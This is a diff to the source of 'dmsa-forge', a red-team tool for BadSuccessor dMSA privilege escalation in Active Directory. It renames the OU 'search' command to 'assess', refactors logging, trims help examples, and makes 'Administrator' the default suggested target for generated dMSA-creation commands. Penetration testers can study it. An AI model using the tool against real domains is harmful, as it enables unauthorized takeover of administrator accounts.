@@ -18,8 +18,8 @@
 #
 # Description:
 #   A redteaming tool for authorized BadSuccessor LDAP exploitation on dMSA:
-#   add, verify, delete, and search.
-#   Search function is based on AKAMAI Get-BadSuccessorOUPermissions.ps1:
+#   assess, add, verify, and delete.
+#   Assessment function is based on AKAMAI Get-BadSuccessorOUPermissions.ps1:
 #   https://github.com/akamai/BadSuccessor/blob/main/Get-BadSuccessorOUPermissions.ps1
 #   This version keeps Impacket attribution/licensing, but heavily refactors the
 #   add/verify/delete paths to avoid optimistic success and incomplete dMSA objects.
@@ -45,14 +45,14 @@ from . import __version__
 
 TOOL_NAME = 'dmsa-forge'
 TOOL_VERSION = 'v%s' % __version__
-TOOL_DESCRIPTION = 'A redteaming tool for authorized BadSuccessor LDAP exploitation on dMSA: add, verify, delete, and search.'
+TOOL_DESCRIPTION = 'A redteaming tool for authorized BadSuccessor LDAP exploitation on dMSA: assess, add, verify, and delete.'
 SCHEMA_VERSION = '1.0'
 MODIFICATIONS_BY = 'RedteamNotes'
 PROJECT_URL = 'https://github.com/RedteamNotes/dmsa-forge'
 DEFAULT_UPDATE_SOURCE = 'git+https://github.com/RedteamNotes/dmsa-forge.git'
 DEFAULT_UPDATE_VERSION_URL = 'https://api.github.com/repos/RedteamNotes/dmsa-forge/releases/latest'
 DEFAULT_SUGGESTED_DMSA_NAME = 'redpen'
-TARGET_ACCOUNT_PLACEHOLDER = 'ACCOUNT_TO_SUCCEED'
+SUGGESTED_TARGET_ACCOUNT = 'Administrator'
 PRINCIPALS_ALLOWED_PLACEHOLDER = 'SID_OR_NAME'
 BADSUCCESSOR_RIGHTS_LABEL = 'BadSuccessor-relevant OU rights'
 BADSUCCESSOR_RIGHTS_MEANING = 'create dMSA objects or control listed OUs'
@@ -135,6 +135,16 @@ class TerminalColorFormatter(logging.Formatter):
         if record.levelno >= logging.WARNING:
             return '%s%s%s' % (ANSI_YELLOW, text, ANSI_RESET)
         return text
+
+
+def log_section(title):
+    logging.info('')
+    logging.info('%s' % title)
+
+
+def log_kv(label, value, width=24):
+    logging.info('%-*s %s' % (width, label, value))
+
 
 try:
     from impacket.examples import logger
@@ -594,13 +604,13 @@ class DMSAForge:
         }
 
     def _log_run_metadata(self, target_host, dc_ip):
-        logging.info('%-24s %s' % ('Operation ID:', self._operation_id))
-        logging.info('%-24s %s' % ('Action:', self._action))
-        logging.info('%-24s %s' % ('Target DC:', dc_ip if dc_ip else target_host))
-        logging.info('%-24s %s' % ('LDAP Method:', self._method))
-        logging.info('%-24s %s' % ('LDAP Port:', self._port))
-        logging.info('%-24s %s' % ('Auth:', 'Kerberos' if self._do_kerberos else 'NTLM'))
-        logging.info('%-24s %s' % ('Base DN:', self._display_dn(self._base_dn)))
+        log_section('Run context')
+        log_kv('Operation ID:', self._operation_id)
+        log_kv('Action:', self._action)
+        log_kv('Target DC:', dc_ip if dc_ip else target_host)
+        log_kv('LDAP:', '%s/%d' % (self._method, self._port))
+        log_kv('Auth:', 'Kerberos' if self._do_kerberos else 'NTLM')
+        log_kv('Base DN:', self._display_dn(self._base_dn))
 
     def _connection_candidates(self):
         candidates = [(self._method, self._port, 'selected/default')]
@@ -784,13 +794,14 @@ class DMSAForge:
         self._reconcile_root_dse_base_dn(ldap_connection, target_host, dc_ip)
 
         connect_to = dc_ip if dc_ip else target_host
+        log_section('Progress')
         logging.info('Connected to %s using %s/%d' % (connect_to, self._method, self._port))
 
         try:
             action_handlers = {
                 'add': self.add_dmsa,
                 'delete': self.delete_dmsa,
-                'search': self.search_ous,
+                'assess': self.search_ous,
                 'verify': self.verify_dmsa,
             }
             handler = action_handlers.get(self._action)
@@ -840,12 +851,10 @@ class DMSAForge:
                 if exists_after_delete is None:
                     logging.error('Could not verify post-delete absence: %s' % self._display_dn(dmsa_dn))
 
-            logging.info("")
-            logging.info("%-30s %s" % ("dMSA Deletion Results", ""))
-            logging.info("%-30s %s" % ("-" * 30, "-" * 30))
-            logging.info("%-30s %s" % ("dMSA Name:", '%s$' % self._dmsa_name))
-            logging.info("%-30s %s" % ("DeleteRequest:", "SUCCESS" if delete_success else "FAILED"))
-            logging.info("%-30s %s" % ("Post-delete Verification:", "SUCCESS" if verified_absent else "FAILED"))
+            log_section('Findings')
+            log_kv("dMSA Name:", '%s$' % self._dmsa_name, width=30)
+            log_kv("DeleteRequest:", "SUCCESS" if delete_success else "FAILED", width=30)
+            log_kv("Post-delete Verification:", "SUCCESS" if verified_absent else "FAILED", width=30)
 
             if delete_success and not verified_absent:
                 logging.error('DeleteRequest succeeded but object is still readable: %s' % self._display_dn(dmsa_dn))
@@ -913,7 +922,7 @@ class DMSAForge:
 
     def search_ous(self, ldap_connection):
         try:
-            logging.info('Running BadSuccessor OU search in %s mode...' % ('summary' if self._search_summary else 'security-descriptor analysis'))
+            logging.info('Running BadSuccessor OU assessment in %s mode...' % ('summary' if self._search_summary else 'security-descriptor analysis'))
 
             if not ldap_connection.bound:
                 message = 'LDAP connection is not bound.'
@@ -932,7 +941,7 @@ class DMSAForge:
                 )
 
                 if not success:
-                    prereq_warning = 'Domain Controller prerequisite check failed; continuing OU search. %s' % ldap_connection.result
+                    prereq_warning = 'Domain Controller prerequisite check failed; continuing OU assessment. %s' % ldap_connection.result
                     logging.warning(prereq_warning)
                 else:
                     prereq_flag = False
@@ -962,7 +971,7 @@ class DMSAForge:
             search_base = self._target_ou or self._base_dn
             fallback_warning = ''
             if self._target_ou:
-                logging.info('Restricting OU search to %s' % self._display_dn(self._target_ou))
+                logging.info('Restricting OU assessment to %s' % self._display_dn(self._target_ou))
 
             success = ldap_connection.search(
                 search_base=search_base,
@@ -978,11 +987,11 @@ class DMSAForge:
                 if not self._target_ou:
                     fallback_ou = self._infer_authenticated_account_ou(ldap_connection)
                     if fallback_ou:
-                        fallback_warning = 'Broad OU search failed; retried with inferred authenticated account OU.'
+                        fallback_warning = 'Broad OU assessment failed; retried with inferred authenticated account OU.'
                         self._record_inference(
                             'target_ou',
                             'fallback',
-                            'broad OU search failed, using authenticated account parent OU %s' % self._display_dn(fallback_ou),
+                            'broad OU assessment failed, using authenticated account parent OU %s' % self._display_dn(fallback_ou),
                             level=logging.WARNING,
                         )
                         self._target_ou = fallback_ou
@@ -998,11 +1007,11 @@ class DMSAForge:
                         )
 
                 if success:
-                    logging.info('Fallback OU search succeeded at %s' % self._display_dn(search_base))
+                    logging.info('Fallback OU assessment succeeded at %s' % self._display_dn(search_base))
                 else:
                     if broad_result is not None:
                         ldap_connection.result = broad_result
-                    message = 'Failed to search for organizational units.'
+                    message = 'Failed to assess organizational units.'
                     logging.error('%s %s' % (message, ldap_connection.result))
                     self._set_report_failure('ou_search_failed', message, ldap_result=ldap_connection.result)
                     return False
@@ -1139,6 +1148,7 @@ class DMSAForge:
                         'sam_account_name': getattr(self, '_username', None),
                     }
 
+                log_section('Findings')
                 logging.info('Found %d identities with %s.' % (len(allowed_identities), BADSUCCESSOR_RIGHTS_LABEL))
                 logging.info('Rights evaluated: %s.' % BADSUCCESSOR_RIGHTS_MEANING)
                 if current_user.get('status') == 'ok':
@@ -1169,6 +1179,7 @@ class DMSAForge:
                     ou_list = "{%s}" % ", ".join([self._display_dn(ou) for ou in ous])
                     logging.info("%-50s %-18s %s" % (identity[:50], self._bound_user_match_display(sid, current_user), ou_list))
             else:
+                log_section('Findings')
                 logging.info('No identities found with %s.' % BADSUCCESSOR_RIGHTS_LABEL)
                 logging.info("")
                 logging.info("%-50s %-18s %s" % ("Identity", "Bound account", "OUs with relevant rights"))
@@ -1218,7 +1229,7 @@ class DMSAForge:
             return True
 
         except Exception as e:
-            message = 'BadSuccessor search failed: %s' % str(e)
+            message = 'BadSuccessor assessment failed: %s' % str(e)
             logging.error(message)
             self._set_report_failure('search_exception', message)
             return False
@@ -2146,17 +2157,6 @@ class DMSAForge:
 
                 if not errors:
                     logging.info('Post-add verification succeeded on attempt %d/%d.' % (attempt, attempts))
-                    logging.info('%-30s %s' % ('Verified DN:', self._display_dn(entry.entry_dn)))
-                    logging.info('%-30s %s' % ('Verified sAMAccountName:', sam))
-                    logging.info('%-30s %s' % ('Verified DNS Hostname:', dns))
-                    logging.info('%-30s %s' % ('Verified Target DN:', self._display_dn(predecessor)))
-                    logging.info('%-30s %s' % ('Verified MSA State:', format_dmsa_delegated_state(state)))
-                    membership_lines = self._display_security_descriptor_summary_lines(membership)
-                    logging.info('%-30s %s' % ('Verified MSA Membership:', membership_lines[0]))
-                    for line in membership_lines[1:]:
-                        logging.info('%-30s %s' % ('', line))
-                    logging.info('LDAP Post-add Verification: SUCCESS')
-                    logging.info('KDC Readiness: NOT VERIFIED by this script')
                     return True
 
                 last_errors = errors
@@ -2331,16 +2331,16 @@ class DMSAForge:
                 delay=self._verify_delay
             )
 
-            logging.info("")
-            logging.info("%-30s %s" % ("-" * 30, "-" * 30))
-            logging.info("%-30s %s" % ("dMSA Name:", '%s$' % self._dmsa_name))
-            logging.info("%-30s %s" % ("DNS Hostname:", attributes.get('dNSHostName', 'Unknown')))
-            logging.info("%-30s %s" % ("Migration status:", format_dmsa_delegated_state(attributes.get('msDS-DelegatedMSAState'))))
-            logging.info("%-30s %s" % ("Principals Allowed:", self._display_value(principals_allowed)))
-            logging.info("%-30s %s" % ("Principals Allowed SID:", user_sid))
-            logging.info("%-30s %s" % ("Target Account:", self._display_value(target_account)))
-            logging.info("%-30s %s" % ("Target DN:", self._display_dn(target_dn)))
-            logging.info("%-30s %s" % ("Group MSA Membership:", "verified" if verified else "NOT VERIFIED"))
+            log_section('Findings')
+            log_kv("dMSA Name:", '%s$' % self._dmsa_name, width=30)
+            log_kv("dMSA DN:", self._display_dn(dmsa_dn), width=30)
+            log_kv("DNS Hostname:", attributes.get('dNSHostName', 'Unknown'), width=30)
+            log_kv("Migration status:", format_dmsa_delegated_state(attributes.get('msDS-DelegatedMSAState')), width=30)
+            log_kv("Principals Allowed:", self._display_value(principals_allowed), width=30)
+            log_kv("Principals Allowed SID:", user_sid, width=30)
+            log_kv("Target Account:", self._display_value(target_account), width=30)
+            log_kv("Target DN:", self._display_dn(target_dn), width=30)
+            log_kv("Group MSA Membership:", "verified" if verified else "NOT VERIFIED", width=30)
             logging.info("LDAP Post-add Verification: %s" % ("SUCCESS" if verified else "FAILED"))
             if verified:
                 logging.info("KDC Readiness: NOT VERIFIED by this script")
@@ -2388,7 +2388,7 @@ class DMSAForge:
             dc_ip=self._target_ip,
         )
 
-        logging.info('')
+        log_section('Kerberos commands')
         for line in lines:
             logging.info(line)
         return lines
@@ -2456,18 +2456,17 @@ class DMSAForge:
                     )
                     return False
 
-            logging.info('')
-            logging.info('%-30s %s' % ('-' * 30, '-' * 30))
-            logging.info('%-30s %s' % ('Verified DN:', self._display_dn(entry.entry_dn)))
-            logging.info('%-30s %s' % ('Verified sAMAccountName:', sam))
-            logging.info('%-30s %s' % ('Verified DNS Hostname:', dns))
-            logging.info('%-30s %s' % ('Verified Target DN:', self._display_dn(predecessor)))
-            logging.info('%-30s %s' % ('Verified MSA State:', format_dmsa_delegated_state(state)))
+            log_section('Findings')
+            log_kv('Verified DN:', self._display_dn(entry.entry_dn), width=30)
+            log_kv('Verified sAMAccountName:', sam, width=30)
+            log_kv('Verified DNS Hostname:', dns, width=30)
+            log_kv('Verified Target DN:', self._display_dn(predecessor), width=30)
+            log_kv('Verified MSA State:', format_dmsa_delegated_state(state), width=30)
 
             membership_lines = self._display_security_descriptor_summary_lines(membership)
-            logging.info('%-30s %s' % ('Verified MSA Membership:', membership_lines[0]))
+            log_kv('Verified MSA Membership:', membership_lines[0], width=30)
             for line in membership_lines[1:]:
-                logging.info('%-30s %s' % ('', line))
+                log_kv('', line, width=30)
 
             errors = []
             if str(sam).lower() != ('%s$' % self._dmsa_name).lower():
@@ -2495,7 +2494,7 @@ class DMSAForge:
                 )
                 return False
 
-            logging.info('%-30s %s' % ('Verification:', 'SUCCESS'))
+            log_kv('Verification:', 'SUCCESS', width=30)
             kerberos_guidance = self.print_rubeus_guidance() if self._kerberos_guidance else []
             self._set_report_result(
                 dmsa_name='%s$' % self._dmsa_name,
@@ -2517,45 +2516,34 @@ class DMSAForge:
             return False
 
 
-ACTION_CHOICES = ('search', 'add', 'verify', 'delete')
+VISIBLE_ACTION_CHOICES = ('assess', 'add', 'verify', 'delete')
+ASSESS_ACTIONS = ('assess',)
+ACTION_CHOICES = VISIBLE_ACTION_CHOICES
 ACTION_SUMMARY = {
-    'search': 'Analyze OU security descriptors for BadSuccessor-relevant rights.',
+    'assess': 'Assess OU security descriptors for BadSuccessor-relevant rights.',
     'add': 'Create and verify a dMSA object for an authorized target account.',
     'verify': 'Read and validate an existing dMSA object without LDAP writes.',
     'delete': 'Delete a dMSA object, with explicit --yes confirmation required.',
 }
 ACTION_USAGE = {
-    'search': '%(prog)s [domain/]username[:password] [options]',
+    'assess': '%(prog)s [domain/]username[:password] [options]',
     'add': '%(prog)s [domain/]username[:password] --target-ou OU_DN [options]',
     'verify': '%(prog)s [domain/]username[:password] --target-ou OU_DN --dmsa-name NAME [options]',
     'delete': '%(prog)s [domain/]username[:password] --target-ou OU_DN --dmsa-name NAME --yes [options]',
 }
-ACTION_SHORTCUT_HELP = '''action shortcuts:
-  dmsa-forge search [domain/]username[:password] [options]
-  dmsa-forge add [domain/]username[:password] --target-ou OU_DN [options]
-  dmsa-forge verify [domain/]username[:password] --target-ou OU_DN --dmsa-name NAME [options]
-  dmsa-forge delete [domain/]username[:password] --target-ou OU_DN --dmsa-name NAME [options]
-
-local setup:
-  dmsa-forge plan add [domain/]username[:password] --target-ou OU_DN [options]
-  dmsa-forge update
-
-Use "dmsa-forge ACTION -h" for action-specific options.
-'''
-
 ACTION_REQUIREMENTS = {
     'add': (('target_ou', '--target-ou'),),
     'delete': (('dmsa_name', '--dmsa-name'), ('target_ou', '--target-ou')),
     'verify': (('dmsa_name', '--dmsa-name'), ('target_ou', '--target-ou')),
 }
 DESTRUCTIVE_ACTIONS = ('delete',)
-REMOVED_COMMANDS = ('init', 'config', 'guidance', 'modify', 'completion', 'actions', 'examples', 'help')
+REMOVED_COMMANDS = ('init', 'config', 'guidance', 'modify', 'completion', 'actions', 'examples', 'help', 'search')
 UTILITY_COMMANDS = ('plan', 'update')
-SUBCOMMAND_CHOICES = ACTION_CHOICES + UTILITY_COMMANDS
+SUBCOMMAND_CHOICES = VISIBLE_ACTION_CHOICES + UTILITY_COMMANDS
 
 CLI_DEFAULTS = {
     'account': '',
-    'action': 'search',
+    'action': 'assess',
     'aes_key': None,
     'allow_admin_fallback': False,
     'base_dn': None,
@@ -2616,12 +2604,12 @@ OPTION_ALIASES = {
     'dmsa_name': ('--dmsa-name', '-dmsa-name'),
     'dns_hostname': ('--dns-hostname', '-dns-hostname'),
     'dry_run': ('--dry-run', '--plan'),
-    'include_sd': ('--include-security-descriptor', '--include-sd'),
+    'include_sd': ('--include-security-descriptor',),
     'json': ('--json',),
     'k': ('--kerberos', '-k'),
     'kdc_wait': ('--kdc-wait', '-kdc-wait'),
     'kerberos_guidance': ('--kerberos-guidance',),
-    'low_noise': ('--low-noise', '--lean'),
+    'low_noise': ('--lean',),
     'method': ('--method', '-method'),
     'minimal': ('--minimal',),
     'next_step_prefix': ('--next-step-prefix', '--command-prefix'),
@@ -2645,55 +2633,27 @@ OPTION_ALIASES = {
 }
 
 ACTION_HELP = {
-    'search': '''search - discover candidate OUs
-
-Usage:
-  dmsa-forge search [domain/]username[:password] [options]
+    'assess': '''assess - evaluate BadSuccessor OU feasibility
 
 Default behavior:
-  Requests OU security descriptors and analyzes BadSuccessor-relevant rights.
+  Requests OU security descriptors, analyzes BadSuccessor-relevant rights,
+  and checks whether the bound account matches any listed effective SID.
   Use --summary for a lightweight OU-only listing.
-
-Example:
-  dmsa-forge search eighteen.htb/adam.scott:'PASSWORD' --include-security-descriptor --resolve-names
 ''',
     'add': '''add - create and verify a dMSA object
-
-Usage:
-  dmsa-forge add [domain/]username[:password] --target-ou OU_DN --target-account ACCOUNT --principals-allowed SID_OR_NAME [options]
 
 Required:
   --target-ou OU_DN
   --target-account ACCOUNT_OR_DN
   --principals-allowed USER_OR_SID
-
-Strongly recommended:
-  --dry-run first
-  --dmsa-name NAME for reproducible cleanup
-
-Example:
-  dmsa-forge add eighteen.htb/adam.scott:'PASSWORD' --dc-host dc01.eighteen.htb --target-ou 'OU=Staff,DC=eighteen,DC=htb' --dmsa-name redpen --target-account ACCOUNT_TO_SUCCEED --principals-allowed '<SID_OR_NAME>'
 ''',
     'verify': '''verify - read and validate an existing dMSA object
-
-Usage:
-  dmsa-forge verify [domain/]username[:password] --target-ou OU_DN --dmsa-name NAME [options]
 
 Required:
   --target-ou OU_DN
   --dmsa-name NAME
-
-Optional:
-  --principals-allowed USER_OR_SID  validate expected membership SID
-  --json                            emit a structured verification report
-
-Example:
-  dmsa-forge verify eighteen.htb/adam.scott:'PASSWORD' --target-ou 'OU=Staff,DC=eighteen,DC=htb' --dmsa-name redpen --json
 ''',
     'delete': '''delete - remove a dMSA object
-
-Usage:
-  dmsa-forge delete [domain/]username[:password] --target-ou OU_DN --dmsa-name NAME --yes [options]
 
 Required:
   --target-ou OU_DN
@@ -2703,9 +2663,6 @@ Required:
 Safety:
   Use --dry-run first. The account domain is used as the default scope guardrail;
   override it with --scope-domain or --scope-base-dn when needed.
-
-Example:
-  dmsa-forge delete eighteen.htb/adam.scott:'PASSWORD' --target-ou 'OU=Staff,DC=eighteen,DC=htb' --dmsa-name redpen --yes
 ''',
 }
 
@@ -2768,68 +2725,22 @@ def removed_command_message(command):
         return '"modify" was removed; use delete/add/verify. dMSA core attributes are created atomically during add.'
     if command == 'completion':
         return '"completion" was removed; use %s for current-session completion.' % completion_eval_hint()
+    if command == 'search':
+        return '"search" was removed; use "dmsa-forge assess ..." to evaluate BadSuccessor OU feasibility.'
     if command in ('actions', 'examples', 'help'):
         return '"%s" was removed; use "dmsa-forge -h" or "dmsa-forge ACTION -h".' % command
     return '"%s" is not available.' % command
 
 
-def legacy_action_value(argv):
-    for index, arg in enumerate(argv):
-        if arg in ('--action', '-action') and index + 1 < len(argv):
-            return argv[index + 1]
-        for prefix in ('--action=', '-action='):
-            if arg.startswith(prefix):
-                return arg.split('=', 1)[1]
-    return None
+def has_legacy_action_flag(argv):
+    return any(
+        arg in ('--action', '-action') or arg.startswith('--action=') or arg.startswith('-action=')
+        for arg in argv
+    )
 
 
-ADVANCED_HELP_TEXT = '''advanced options for {action}
-
-Reporting:
-  --profile safe|report|ci   apply a local preset
-  --json                     emit structured JSON
-  --output FILE              write report with mode 0600
-  --output-only              JSON/file-only output; implies quiet/no-banner
-  --no-redact --debug        disable local output redaction for debugging
-
-Authentication:
-  --kerberos, -k             use Kerberos credentials from ccache
-  --hashes LMHASH:NTHASH     use NTLM hashes
-  --aes-key HEX              use an AES key for Kerberos
-  --no-pass                  do not prompt for a password
-
-LDAP and scope:
-  --dc-host HOSTNAME         domain controller hostname
-  --dc-ip IP                 domain controller IP
-  --method LDAP|LDAPS        connection method; defaults to LDAP
-  --port 389|636             destination port; omitted method/port can try LDAP then LDAPS
-  --base-dn BASE_DN          LDAP base DN; inferred from DOMAIN/user
-  --scope-domain FQDN        domain guardrail; inferred from DOMAIN/user
-  --scope-base-dn BASE_DN    DN guardrail; inferred from scope domain
-
-Workflow and compatibility:
-  --verify-attempts N        post-add LDAP verification attempts
-  --verify-delay SECONDS     delay between verification attempts
-  --kdc-wait SECONDS         explicit post-LDAP delay before external Kerberos
-  --allow-admin-fallback     compatibility flag; exact DN candidates are automatic
-  --next-step-prefix COMMAND prefix generated next-step commands only
-  --ts                      timestamp log lines
-  --debug                   verbose local debug output
-
-Compatibility aliases:
-  --lean                    preferred alias for lighter local output defaults
-  --low-noise               compatibility alias for --lean
-  --minimal-output          compatibility alias for --output-only
-  single-dash Impacket-style options such as -dc-host remain accepted
-'''
-
-
-def print_advanced_help(action):
-    if action not in ACTION_CHOICES:
-        sys.stderr.write('Unknown action: %s\n' % action)
-        return 2
-    print(ADVANCED_HELP_TEXT.format(action=action).rstrip())
-    return 0
+def legacy_action_message():
+    return '--action was removed; use task-named commands such as "dmsa-forge assess ...", "dmsa-forge add ...", "dmsa-forge verify ...", or "dmsa-forge delete ...".'
 
 
 def print_plan_help():
@@ -2837,10 +2748,6 @@ def print_plan_help():
 
 Usage:
   dmsa-forge plan ACTION [domain/]username[:password] [options]
-
-Examples:
-  dmsa-forge plan add eighteen.htb/user --target-ou OU=Staff,DC=eighteen,DC=htb --target-account ACCOUNT_TO_SUCCEED --principals-allowed SID_OR_NAME
-  dmsa-forge plan delete eighteen.htb/user --dmsa-name redpen --target-ou OU=Staff,DC=eighteen,DC=htb
 
 Behavior:
   Equivalent to "dmsa-forge ACTION ... --dry-run". It validates local inputs and
@@ -3598,7 +3505,7 @@ def planned_ldap_operations(options):
     verify_attempts = getattr(options, 'verify_attempts', DEFAULT_VERIFY_ATTEMPTS)
 
     operations = []
-    if options.action == 'search':
+    if options.action in ASSESS_ACTIONS:
         ou_search_base = options.target_ou or base_dn
         if not options.skip_dc_prereq:
             operations.append({
@@ -3936,7 +3843,7 @@ def append_workflow_options(
         append_option(parts, '--principals-allowed', effective_principals_allowed)
     elif action == 'delete':
         append_option(parts, '--yes', True if yes is True or options.yes else None)
-    elif action == 'search':
+    elif action in ASSESS_ACTIONS:
         append_option(parts, '--target-ou', options.target_ou)
         include_sd = options.include_sd if include_security_descriptor is None else include_security_descriptor
         resolve = options.resolve_names if resolve_names is None else resolve_names
@@ -3974,7 +3881,7 @@ def command_for_search_add_plan(options, candidate):
         return None
 
     dmsa_name = options.dmsa_name or DEFAULT_SUGGESTED_DMSA_NAME
-    target_account = options.target_account or TARGET_ACCOUNT_PLACEHOLDER
+    target_account = options.target_account or SUGGESTED_TARGET_ACCOUNT
     parts = [TOOL_NAME, 'plan', 'add', options.account]
     append_connection_options(parts, options)
     append_auth_options(parts, options)
@@ -4027,7 +3934,7 @@ def suggested_dmsa_name_from_target_account(options):
 
 def command_for_dry_run_action(options):
     suggested_dmsa_name = suggested_dmsa_name_from_target_account(options)
-    target_account = options.target_account or TARGET_ACCOUNT_PLACEHOLDER
+    target_account = options.target_account or SUGGESTED_TARGET_ACCOUNT
     principals_allowed = options.principals_allowed or PRINCIPALS_ALLOWED_PLACEHOLDER
     if suggested_dmsa_name:
         command = command_for_action(
@@ -4035,7 +3942,7 @@ def command_for_dry_run_action(options):
             options,
             yes=True,
             dmsa_name=suggested_dmsa_name,
-            target_account=TARGET_ACCOUNT_PLACEHOLDER,
+            target_account=SUGGESTED_TARGET_ACCOUNT,
             principals_allowed=principals_allowed,
         )
         return command, ''
@@ -4136,7 +4043,7 @@ def build_next_steps(options, mode, success, result=None, report=None):
         if not options.kerberos_guidance:
             for command in kerberos_guidance_commands_for_options(options):
                 add('Kerberos command', command)
-    elif options.action == 'search':
+    elif options.action in ASSESS_ACTIONS:
         if not search_result_has_followup_value(result):
             return steps
         candidates = search_next_step_candidates(result)
@@ -4146,9 +4053,9 @@ def build_next_steps(options, mode, success, result=None, report=None):
                 command_for_search_add_plan(options, candidates[0]),
             )
         elif not (options.include_sd and options.resolve_names):
-            add('Resolve matching SID names', command_for_action('search', options, include_security_descriptor=True, resolve_names=True))
+            add('Resolve matching SID names', command_for_action(options.action, options, include_security_descriptor=True, resolve_names=True))
     elif options.action == 'delete':
-        add('Confirm cleanup with search', command_for_action('search', options))
+        add('Confirm cleanup with assess', command_for_action('assess', options))
     return steps
 
 
@@ -4168,8 +4075,7 @@ def print_next_steps(options, report):
     steps = (report.get('result') or {}).get('next_steps') or []
     if not steps:
         return
-    logging.info('')
-    logging.info('Next steps:')
+    log_section('Next steps')
     for step in steps:
         if step.get('hint'):
             logging.info('  %s' % step.get('hint'))
@@ -4244,16 +4150,14 @@ def planned_bad_successor_values(options, report):
 def print_action_plan_summary(options, report):
     inferred_kinds = inferred_plan_kinds(report)
     if options.action == 'add':
+        log_section('Planned values')
         logging.info('BadSuccessor values:')
         for name, value, kind in planned_bad_successor_values(options, report):
             logging.info('  %-35s %s' % (name + ':', mark_inferred(value, kind, inferred_kinds)))
-    elif options.action == 'search':
-        logging.info('Search values:')
-        ou_kind = None if options.target_ou else 'base_dn'
-        logging.info('  %-35s %s' % ('OU base:', mark_inferred(options.target_ou or current_base_dn(options) or '(derived at runtime)', ou_kind, inferred_kinds)))
-        logging.info('  %-35s %s' % ('Security descriptors:', 'yes' if options.include_sd else 'no'))
-        logging.info('  %-35s %s' % ('Resolve names:', 'yes' if options.resolve_names else 'no'))
+    elif options.action in ASSESS_ACTIONS:
+        return
     elif options.action in ('verify', 'delete'):
+        log_section('Planned values')
         logging.info('dMSA object:')
         logging.info('  %-35s %s' % ('dMSA DN:', planned_dmsa_dn(options) or '(needs --dmsa-name and --target-ou)'))
 
@@ -4265,8 +4169,9 @@ def print_dry_run_plan(options, report=None):
 
     inferred_kinds = inferred_plan_kinds(report)
     logging.info('Dry run: no LDAP connection will be opened and no changes will be made.')
-    logging.info('%-24s %s' % ('Operation ID:', report['operation_id']))
-    logging.info('%-24s %s' % ('Action:', report['action']))
+    log_section('Run context')
+    log_kv('Operation ID:', report['operation_id'])
+    log_kv('Action:', report['action'])
     log_plan_field('Account:', report['inputs']['account'], None, inferred_kinds)
     log_plan_field('Method:', report['connection']['method'], 'method', inferred_kinds)
     log_plan_field('Port:', report['connection']['port'], 'port', inferred_kinds)
@@ -4275,12 +4180,23 @@ def print_dry_run_plan(options, report=None):
     log_plan_field('Base DN:', report['connection']['base_dn'], 'base_dn', inferred_kinds)
     log_plan_field('Scope Domain:', report['scope']['domain'], 'scope_domain', inferred_kinds)
     log_plan_field('Scope Base DN:', report['scope']['base_dn'], 'scope_base_dn', inferred_kinds)
-    log_plan_field('Target OU:', report['inputs']['target_ou'], None, inferred_kinds)
-    log_plan_field('dMSA Name:', report['inputs']['dmsa_name'], None, inferred_kinds)
-    logging.info('%-24s %s' % ('Planned dMSA DN:', report['inputs']['planned_dmsa_dn']))
-    log_plan_field('Target Account:', report['inputs']['target_account'], 'target_account', inferred_kinds)
-    log_plan_field('Principals Allowed:', report['inputs']['principals_allowed'], 'principals_allowed', inferred_kinds)
-    log_plan_field('DNS Hostname:', report['inputs']['dns_hostname'], 'dns_hostname', inferred_kinds)
+    if options.action in ASSESS_ACTIONS:
+        log_plan_field('OU Base:', options.target_ou or report['connection']['base_dn'], None if options.target_ou else 'base_dn', inferred_kinds)
+        logging.info('%-24s %s' % ('Security descriptors:', 'yes' if options.include_sd else 'no'))
+        logging.info('%-24s %s' % ('Resolve names:', 'yes' if options.resolve_names else 'no'))
+    elif options.action == 'add':
+        log_plan_field('Target OU:', report['inputs']['target_ou'], None, inferred_kinds)
+        log_plan_field('dMSA Name:', report['inputs']['dmsa_name'], None, inferred_kinds)
+        logging.info('%-24s %s' % ('Planned dMSA DN:', report['inputs']['planned_dmsa_dn']))
+        log_plan_field('Target Account:', report['inputs']['target_account'], 'target_account', inferred_kinds)
+        log_plan_field('Principals Allowed:', report['inputs']['principals_allowed'], 'principals_allowed', inferred_kinds)
+        log_plan_field('DNS Hostname:', report['inputs']['dns_hostname'], 'dns_hostname', inferred_kinds)
+    elif options.action in ('verify', 'delete'):
+        log_plan_field('Target OU:', report['inputs']['target_ou'], None, inferred_kinds)
+        log_plan_field('dMSA Name:', report['inputs']['dmsa_name'], None, inferred_kinds)
+        logging.info('%-24s %s' % ('Planned dMSA DN:', report['inputs']['planned_dmsa_dn']))
+        if options.action == 'verify':
+            log_plan_field('Principals Allowed:', report['inputs']['principals_allowed'], 'principals_allowed', inferred_kinds)
     logging.info('%-24s %s' % ('Kerberos:', 'yes' if options.k else 'no'))
     logging.info('%-24s %s' % ('Hashes:', options.hashes or '(not set)'))
     logging.info('%-24s %s' % ('AES Key:', options.aes_key or '(not set)'))
@@ -4374,81 +4290,7 @@ def emit_report(options, report):
     return True
 
 
-def build_parser():
-    parser = argparse.ArgumentParser(
-        prog='dmsa-forge',
-        usage='%(prog)s [action] [domain/]username[:password] [options]',
-        add_help=True,
-        description=TOOL_DESCRIPTION,
-        epilog=ACTION_SHORTCUT_HELP,
-        formatter_class=argparse.RawDescriptionHelpFormatter,
-    )
-    parser.add_argument(
-        '-v',
-        '--version',
-        action='version',
-        version='%s %s' % (TOOL_NAME, TOOL_VERSION),
-    )
-    parser.add_argument('--completion-script', choices=('bash', 'zsh'), help=argparse.SUPPRESS)
-    parser.add_argument('account', action='store', metavar='[domain/]username[:password]', help='Account used to authenticate to DC.')
-
-    workflow = parser.add_argument_group('workflow')
-    workflow.add_argument('--action', '-action', choices=ACTION_CHOICES, default='search', help='Action to perform. Prefer task-named commands such as "dmsa-forge add ...".')
-    workflow.add_argument('--dmsa-name', '-dmsa-name', dest='dmsa_name', action='store', metavar='NAME', help='dMSA name. Add auto-generates dMSA-[A-Z0-9]{8} if omitted; verify/delete require it.')
-    workflow.add_argument('--target-ou', '-target-ou', dest='target_ou', action='store', metavar='OU_DN', help='Target OU DN, for example "OU=Staff,DC=domain,DC=local".')
-    workflow.add_argument('--target-account', '-target-account', dest='target_account', action='store', metavar='ACCOUNT_OR_DN', help='Target user/computer sAMAccountName or DN for msDS-ManagedAccountPrecededByLink. Required for add execution.')
-    workflow.add_argument('--principals-allowed', '-principals-allowed', dest='principals_allowed', action='store', metavar='USER_OR_SID', help='User/computer/group name, DN, or SID allowed to retrieve the managed password. Required for add execution.')
-    workflow.add_argument('--dns-hostname', '-dns-hostname', dest='dns_hostname', action='store', metavar='HOSTNAME', help='DNS hostname for the dMSA. Defaults to dmsaname.domain.')
